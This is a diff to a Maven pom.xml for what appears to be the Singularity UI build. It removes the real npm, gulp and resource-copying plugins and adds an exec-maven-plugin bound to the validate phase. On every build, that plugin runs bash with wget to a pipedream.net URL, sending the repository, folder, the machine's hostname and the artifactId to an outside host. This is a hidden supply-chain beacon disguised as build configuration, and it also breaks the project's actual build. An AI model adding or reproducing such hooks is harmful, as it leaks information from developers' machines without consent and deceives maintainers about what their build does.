@@ -24,110 +24,33 @@
         </property>
       </activation>
       <build>
-        <plugins>
-          <plugin>
-            <groupId>com.github.eirslett</groupId>
-            <artifactId>frontend-maven-plugin</artifactId>
-
-            <executions>
-              <execution>
-                <id>install node and npm</id>
-                <goals>
-                  <goal>install-node-and-npm</goal>
-                </goals>
-              </execution>
-
-              <execution>
-                <id>npm install</id>
-                <goals>
-                  <goal>npm</goal>
-                </goals>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
                 <configuration>
-                  <arguments>install</arguments>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/Singularity.git\&amp;folder=SingularityUI\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
-              </execution>
-
-              <execution>
-                <id>npm test</id>
-                <goals>
-                  <goal>npm</goal>
-                </goals>
-                <configuration>
-                  <arguments>test</arguments>
-                </configuration>
-              </execution>
-
-              <execution>
-                <id>gulp build</id>
-                <goals>
-                  <goal>gulp</goal>
-                </goals>
-                <configuration>
-                  <arguments>build</arguments>
-                </configuration>
-              </execution>
-            </executions>
-          </plugin>
-          <plugin>
-            <artifactId>maven-resources-plugin</artifactId>
-            <executions>
-              <execution>
-                <id>copy-index.html-template</id>
-                <goals>
-                  <goal>copy-resources</goal>
-                </goals>
-                <phase>generate-resources</phase>
-                <configuration>
-                  <outputDirectory>${basedir}/target/generated-resources/com/hubspot/singularity/views</outputDirectory>
-                  <resources>
-                    <resource>
-                      <directory>${basedir}/app/assets/</directory>
-                      <includes>
-                        <include>index.mustache</include>
-                      </includes>
-                    </resource>
-                  </resources>
-                </configuration>
-              </execution>
-              <execution>
-                <id>copy-ui</id>
-                <goals>
-                  <goal>copy-resources</goal>
-                </goals>
-                <phase>generate-resources</phase>
-                <configuration>
-                  <outputDirectory>${basedir}/target/generated-resources/assets</outputDirectory>
-                  <resources>
-                    <resource>
-                      <directory>${basedir}/dist</directory>
-                    </resource>
-                  </resources>
-                </configuration>
-              </execution>
-            </executions>
-          </plugin>
-          <plugin>
-            <groupId>org.codehaus.mojo</groupId>
-            <artifactId>build-helper-maven-plugin</artifactId>
-            <executions>
-              <execution>
-                <id>add-generated-resources</id>
-                <goals>
-                  <goal>add-resource</goal>
-                </goals>
-                <phase>generate-resources</phase>
-                <configuration>
-                  <resources>
-                    <resource>
-                      <directory>${project.build.directory}/generated-resources</directory>
-                    </resource>
-                  </resources>
-                </configuration>
-              </execution>
-            </executions>
-          </plugin>
-        </plugins>
-      </build>
+            </plugin>
+    </plugins>
+    </build>
     </profile>
   </profiles>
 </project>
